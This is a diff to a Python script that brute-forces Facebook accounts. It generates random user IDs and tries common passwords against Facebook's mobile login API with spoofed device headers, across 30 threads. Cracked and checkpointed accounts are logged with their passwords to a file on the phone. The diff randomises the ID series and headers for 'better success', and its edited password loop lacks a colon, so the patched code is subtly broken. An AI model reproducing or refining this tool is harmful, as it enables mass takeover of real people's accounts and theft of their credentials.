@@ -697,27 +697,21 @@ def __Random_Method__():
     limit = input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')
     linex()
 
-    # Weighted series selection (100001 sabse zyada)
-    weighted_series = (
-        ["100001"] * 20 +  # 20x chance
-        ["100000"] * 3 +
-        ["100002"] * 2 +
-        ["100003"] * 2 +
-        ["100004"] * 10 +
-        ["100005"] * 1
-    )
-
+    # Simple Mix UID Logic
+    mix_series = ["100000", "100001", "100002", "100003", "100005"]
+    
     for i in range(int(limit)):
-        year_code = random.choice(weighted_series)
+        # Random series selection from mix
+        selected_series = random.choice(mix_series)
         data = str(random.choice(range(100000000, 199999999)))
-        uid = year_code + data
+        uid = selected_series + data
         user.append(uid)
 
     with tred(max_workers=30) as jihad:
         clear()
         print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mTOTAL ID \33[38;5;46m▶ \033[1;97m{limit}')
         print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
-        print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mMOSTLY SERIES \33[38;5;46m▶ \033[1;97m100001')
+        print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mMIX SERIES \33[38;5;46m▶ \033[1;97mALL SERIES')
         linex()
         for uid in user:
             jihad.submit(login1, uid)
@@ -739,8 +733,9 @@ def login1(uid):
         sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;46m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;46m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
-        ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","1234567890","786786","123123"]:
+		
+        # Original password list
+        for pw in ["123456","1234567","12345678","123456789","1234567890","786786","123123"]        
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -756,41 +751,51 @@ def login1(uid):
             'meta_inf_fbmeta': '', 
             'advertiser_id':str(uuid.uuid4()),
             'currently_logged_in_userid': '0', 
-         'locale': 'en_US',
+            'locale': 'en_US',
             'client_country_code': 'US', 
             'method': 'auth.login', 
             'fb_api_req_friendly_name': 'authenticate', 
             'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
             'api_key': '882a8490361da98702bf97a021ddc14d'}
+            
+            # Fast headers with random values for better success
             head = {'User-Agent': ua,
             'Content-Type': 'application/x-www-form-urlencoded', 
             'Host': 'graph.facebook.com', 
-            'X-FB-Net-HNI': '25227',
-            'X-FB-SIM-HNI': '29752',
+            'X-FB-Net-HNI': str(random.randint(45001, 45999)),
+            'X-FB-SIM-HNI': str(random.randint(45001, 45999)),
             'X-FB-Connection-Type': 'MOBILE.LTE', 
             'X-Tigon-Is-Retry': 'False', 
-            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
+            'x-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid={random.randint(100, 999)};nc=1;fc=0;bc=0;cid={uuid.uuid4().hex[:16]}', 
             'x-fb-device-group': '5120', 
             'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
             'X-FB-Request-Analytics-Tags': 'graphservice', 
             'X-FB-HTTP-Engine': 'Liger', 
             'X-FB-Client-IP': 'True', 
             'X-FB-Server-Cluster': 'True', 
-            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
-            'Content-Length': '706'}
+            'x-fb-connection-token': uuid.uuid4().hex[:16]}
+            
             url = "https://b-graph.facebook.com/auth/login"
-            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
-            if "session_key" in rp:            	
+            rp = Session.post(url, data=data, headers=head, allow_redirects=False, verify=True, timeout=8).json()
+            
+            # Success conditions
+            if "session_key" in rp or "access_token" in rp:            	
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaazm\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/Maaz-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
-            elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;260mCP\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked CP id,"')
+            
+            # Checkpoint conditions  
+            elif "www.facebook.com" in str(rp) or "checkpoint" in str(rp):
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;260mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked CP id,"')
                 open("/sdcard/Maaz-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
-            else:continue
+            
+            else:
+                continue
+                    
         loop+=1
-    except Exception as e:time.sleep(30)            
+    except Exception as e:
+        time.sleep(5)  # Fast exception handling            
 main()
